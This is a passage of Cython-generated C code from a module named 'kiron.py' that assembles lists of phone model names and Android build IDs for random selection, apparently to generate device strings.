  __Pyx_INCREF(__pyx_kp_s_Vibe_K5);
  __Pyx_GIVEREF(__pyx_kp_s_Vibe_K5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 20, __pyx_kp_s_Vibe_K5)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Vibe_K5_Note);
  __Pyx_GIVEREF(__pyx_kp_s_Vibe_K5_Note);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 21, __pyx_kp_s_Vibe_K5_Note)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Vibe_K5_Plus_Dual_SIM);
  __Pyx_GIVEREF(__pyx_kp_s_Vibe_K5_Plus_Dual_SIM);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 22, __pyx_kp_s_Vibe_K5_Plus_Dual_SIM)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Vibe_X);
  __Pyx_GIVEREF(__pyx_kp_s_Vibe_X);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 23, __pyx_kp_s_Vibe_X)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Vibe_Z);
  __Pyx_GIVEREF(__pyx_kp_s_Vibe_Z);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 24, __pyx_kp_s_Vibe_Z)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Vision);
  __Pyx_GIVEREF(__pyx_n_s_Vision);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 25, __pyx_n_s_Vision)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Vision_3_Dual_SIM);
  __Pyx_GIVEREF(__pyx_kp_s_Vision_3_Dual_SIM);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 26, __pyx_kp_s_Vision_3_Dual_SIM)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Volt_LS740);
  __Pyx_GIVEREF(__pyx_kp_s_Volt_LS740);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 27, __pyx_kp_s_Volt_LS740)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_VR_Bot_552);
  __Pyx_GIVEREF(__pyx_kp_s_VR_Bot_552);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 28, __pyx_kp_s_VR_Bot_552)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_VX5500);
  __Pyx_GIVEREF(__pyx_n_s_VX5500);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 29, __pyx_n_s_VX5500)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Y21);
  __Pyx_GIVEREF(__pyx_n_s_Y21);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 30, __pyx_n_s_Y21)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Y21L);
  __Pyx_GIVEREF(__pyx_n_s_Y21L);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 31, __pyx_n_s_Y21L)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Y28);
  __Pyx_GIVEREF(__pyx_n_s_Y28);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 32, __pyx_n_s_Y28)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Y3_2018);
  __Pyx_GIVEREF(__pyx_kp_s_Y3_2018);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 33, __pyx_kp_s_Y3_2018)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Y336_U02);
  __Pyx_GIVEREF(__pyx_kp_s_Y336_U02);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 34, __pyx_kp_s_Y336_U02)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Y5_Dual_SIM_2017);
  __Pyx_GIVEREF(__pyx_kp_s_Y5_Dual_SIM_2017);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 35, __pyx_kp_s_Y5_Dual_SIM_2017)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Y5_II);
  __Pyx_GIVEREF(__pyx_kp_s_Y5_II);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 36, __pyx_kp_s_Y5_II)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Y5_Prime_2018_Dual_SIM);
  __Pyx_GIVEREF(__pyx_kp_s_Y5_Prime_2018_Dual_SIM);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 37, __pyx_kp_s_Y5_Prime_2018_Dual_SIM)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Y51);
  __Pyx_GIVEREF(__pyx_n_s_Y51);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 38, __pyx_n_s_Y51)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Y51L);
  __Pyx_GIVEREF(__pyx_n_s_Y51L);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 39, __pyx_n_s_Y51L)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Y55L);
  __Pyx_GIVEREF(__pyx_n_s_Y55L);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 40, __pyx_n_s_Y55L)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Y6_2018);
  __Pyx_GIVEREF(__pyx_kp_s_Y6_2018);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 41, __pyx_kp_s_Y6_2018)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Y6_Dual_SIM_2018);
  __Pyx_GIVEREF(__pyx_kp_s_Y6_Dual_SIM_2018);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 42, __pyx_kp_s_Y6_Dual_SIM_2018)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Y6_Prime_2018);
  __Pyx_GIVEREF(__pyx_kp_s_Y6_Prime_2018);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 43, __pyx_kp_s_Y6_Prime_2018)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Y65);
  __Pyx_GIVEREF(__pyx_n_s_Y65);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 44, __pyx_n_s_Y65)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Y66);
  __Pyx_GIVEREF(__pyx_n_s_Y66);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 45, __pyx_n_s_Y66)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Y69);
  __Pyx_GIVEREF(__pyx_n_s_Y69);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 46, __pyx_n_s_Y69)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Y71);
  __Pyx_GIVEREF(__pyx_n_s_Y71);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 47, __pyx_n_s_Y71)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Y81);
  __Pyx_GIVEREF(__pyx_n_s_Y81);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 48, __pyx_n_s_Y81)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Y83);
  __Pyx_GIVEREF(__pyx_n_s_Y83);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 49, __pyx_n_s_Y83)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Yota_Phone_2);
  __Pyx_GIVEREF(__pyx_kp_s_Yota_Phone_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 50, __pyx_kp_s_Yota_Phone_2)) __PYX_ERR(0, 338, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_YP_GI1);
  __Pyx_GIVEREF(__pyx_kp_s_YP_GI1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 51, __pyx_kp_s_YP_GI1)) __PYX_ERR(0, 338, __pyx_L1_error);
  __pyx_t_4 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_2};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 338, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __pyx_v_mmm = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "kiron.py":339
 *      mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
 *      mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
 *      bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'QKQ1.190910.002', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])             # <<<<<<<<<<<<<<
 *      kkkkki = random.choice(['RMX2185','RMX2085','SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
 *      mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 339, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 339, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(45); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 339, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_kp_s_PQ3B_190801_002);
  __Pyx_GIVEREF(__pyx_kp_s_PQ3B_190801_002);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 0, __pyx_kp_s_PQ3B_190801_002)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_PQ1A_181205_002_A1);
  __Pyx_GIVEREF(__pyx_kp_s_PQ1A_181205_002_A1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 1, __pyx_kp_s_PQ1A_181205_002_A1)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_G950FXXU4DSBA);
  __Pyx_GIVEREF(__pyx_n_s_G950FXXU4DSBA);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 2, __pyx_n_s_G950FXXU4DSBA)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_QKQ1_190910_002);
  __Pyx_GIVEREF(__pyx_kp_s_QKQ1_190910_002);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 3, __pyx_kp_s_QKQ1_190910_002)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_G950FXXS5DSF1);
  __Pyx_GIVEREF(__pyx_n_s_G950FXXS5DSF1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 4, __pyx_n_s_G950FXXS5DSF1)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_G950FXXS8DTC6);
  __Pyx_GIVEREF(__pyx_n_s_G950FXXS8DTC6);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 5, __pyx_n_s_G950FXXS8DTC6)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_G998USQU1ATCU);
  __Pyx_GIVEREF(__pyx_n_s_G998USQU1ATCU);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 6, __pyx_n_s_G998USQU1ATCU)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_G985FXXU7DTJ2);
  __Pyx_GIVEREF(__pyx_n_s_G985FXXU7DTJ2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 7, __pyx_n_s_G985FXXU7DTJ2)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_N986BXXU1BTJ4);
  __Pyx_GIVEREF(__pyx_n_s_N986BXXU1BTJ4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 8, __pyx_n_s_N986BXXU1BTJ4)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_A525FXXU3AUG4);
  __Pyx_GIVEREF(__pyx_n_s_A525FXXU3AUG4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 9, __pyx_n_s_A525FXXU3AUG4)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_T970XXU3BUI7);
  __Pyx_GIVEREF(__pyx_n_s_T970XXU3BUI7);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 10, __pyx_n_s_T970XXU3BUI7)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_F916BXXU1BTKF);
  __Pyx_GIVEREF(__pyx_n_s_F916BXXU1BTKF);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 11, __pyx_n_s_F916BXXU1BTKF)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_N970FXXS8ETK4);
  __Pyx_GIVEREF(__pyx_n_s_N970FXXS8ETK4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 12, __pyx_n_s_N970FXXS8ETK4)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_G975USQU4ETG1);
  __Pyx_GIVEREF(__pyx_n_s_G975USQU4ETG1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 13, __pyx_n_s_G975USQU4ETG1)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_A715FXXU3ATI8);
  __Pyx_GIVEREF(__pyx_n_s_A715FXXU3ATI8);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 14, __pyx_n_s_A715FXXU3ATI8)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_T500XXU3BUA8);
  __Pyx_GIVEREF(__pyx_n_s_T500XXU3BUA8);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 15, __pyx_n_s_T500XXU3BUA8)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_OPM6_171019_030_K1);
  __Pyx_GIVEREF(__pyx_kp_s_OPM6_171019_030_K1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 16, __pyx_kp_s_OPM6_171019_030_K1)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_OPM2_171026_006_C1);
  __Pyx_GIVEREF(__pyx_kp_s_OPM2_171026_006_C1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 17, __pyx_kp_s_OPM2_171026_006_C1)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_TQ1A_230105_001_A3);
  __Pyx_GIVEREF(__pyx_kp_s_TQ1A_230105_001_A3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 18, __pyx_kp_s_TQ1A_230105_001_A3)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SQ1A_211205_008);
  __Pyx_GIVEREF(__pyx_kp_s_SQ1A_211205_008);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 19, __pyx_kp_s_SQ1A_211205_008)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SD1A_210817_037_A1);
  __Pyx_GIVEREF(__pyx_kp_s_SD1A_210817_037_A1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 20, __pyx_kp_s_SD1A_210817_037_A1)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_RP1A_201005_004_A1);
  __Pyx_GIVEREF(__pyx_kp_s_RP1A_201005_004_A1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 21, __pyx_kp_s_RP1A_201005_004_A1)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_PQ1A_181205_006);
  __Pyx_GIVEREF(__pyx_kp_s_PQ1A_181205_006);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 22, __pyx_kp_s_PQ1A_181205_006)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_N9F27L);
  __Pyx_GIVEREF(__pyx_n_s_N9F27L);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 23, __pyx_n_s_N9F27L)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_PPR1_180610_011);
  __Pyx_GIVEREF(__pyx_kp_s_PPR1_180610_011);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 24, __pyx_kp_s_PPR1_180610_011)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_PPR2_180905_006);
  __Pyx_GIVEREF(__pyx_kp_s_PPR2_180905_006);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 25, __pyx_kp_s_PPR2_180905_006)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_QP1A_191105_003);
  __Pyx_GIVEREF(__pyx_kp_s_QP1A_191105_003);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 26, __pyx_kp_s_QP1A_191105_003)) __PYX_ERR(0, 339, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_RD1A_201105_003_C1);
  __Pyx_GIVEREF(__pyx_kp_s_RD1A_201105_003_C1);
